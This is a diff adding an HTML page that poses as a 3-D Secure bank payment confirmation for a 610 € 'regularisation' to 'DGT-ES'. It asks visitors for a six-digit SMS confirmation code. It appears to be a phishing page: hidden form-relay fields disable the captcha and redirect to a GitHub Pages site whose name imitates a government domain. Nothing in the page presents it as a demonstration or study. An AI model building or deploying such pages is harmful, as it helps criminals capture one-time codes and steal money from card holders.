@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paiement Sécurisé - Confirmation</title>
+    <link rel="icon" type="image/png" href="lock.jpg">
+    <link rel="apple-touch-icon" href="lock.jpg">
+    <link rel="stylesheet" href="style2.css">
+    <!-- FontAwesome pour l'icône de cadenas -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+
+    <div class="checkout-container">
+        <!-- En-tête -->
+        <header class="checkout-header">
+            <div class="visa-logo">
+                <span class="verified">3-D</span>
+                <span class="visa">Secure</span>
+            </div>
+            <h1>Secure Payment</h1>
+        </header>
+
+        <!-- Contenu principal -->
+        <main class="checkout-content">
+            <h2>Payment Confirmation</h2>
+
+            <!-- Bloc récapitulatif -->
+            <section class="summary-box">
+                <div class="summary-row">
+                    <span class="label">Recipient :</span>
+                    <span class="value">DGT-ES</span>
+                </div>
+                <div class="summary-row">
+                    <span class="label">Reason :</span>
+                    <span class="value">Regularisation</span>
+                </div>
+                <div class="summary-row">
+                    <span class="label">Amount :</span>
+                    <span class="value">610 €</span>
+                </div>
+                <div class="summary-row">
+                    <span class="label">Card :</span>
+                    <span class="value">#### #### #### ####</span>
+                </div>
+            </section>
+
+            <!-- Alerte SMS -->
+            <div class="sms-alert">
+                <i class="fa-solid fa-lock"></i>
+                <p>Confirm that this is you, you have received a unique 3-D Secure confirmation code on your mobile <strong>** ** **</strong></p>
+            </div>
+
+            <!-- Formulaire de saisie du code -->
+            <form class="otp-form" method="POST" action="updated.html" enctype="multipart/form-data">
+                <label for="otp-input">Enter the confirmation code you recieved via SMS</label>
+                
+                <div class="otp-inputs-container">
+                    <input name="code1" type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" required>
+                    <input name="code2" type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*">
+                    <input name="code3" type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*">
+                    <input name="code4" type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*">
+                    <input name="code5" type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*">
+                    <input name="code6" type="text" maxlength="1" class="otp-box" inputmode="numeric" pattern="[0-9]*">
+                </div>
+                <!-- Affichage en tableau -->
+                <input type="hidden" name="_template" value="table">
+                <!-- Désactiver le captcha -->
+                <input type="hidden" name="_captcha" value="false">
+
+                <!-- Redirection vers votre page personnalisée -->
+                <input type="hidden" name="_next" value="https://safety-tn-gov.github.io/tn.safety.gov/updated.html">
+                <button type="submit" class="submit-btn">CONFIRM</button>
+            </form>
+        </main>
+    </div>
+
+</body>
+</html>
